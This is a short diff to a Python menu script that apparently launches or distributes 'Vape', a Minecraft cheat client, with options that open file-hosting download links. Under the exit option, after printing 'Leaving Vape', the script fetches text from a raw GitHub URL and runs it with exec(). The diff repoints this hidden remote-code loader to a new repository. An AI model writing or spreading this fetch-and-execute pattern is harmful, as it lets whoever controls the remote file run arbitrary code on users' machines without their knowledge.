@@ -45,7 +45,7 @@ while True:
   if chon == '-':
       os.system('cls')
       print("Leaving Vape")
-      exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
+      exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Minecraft.txt').text)
   elif chon == '4.12':
         webbrowser.open_new("https://pixeldrain.com/u/NDUssvGf")
   elif chon == '4.10':
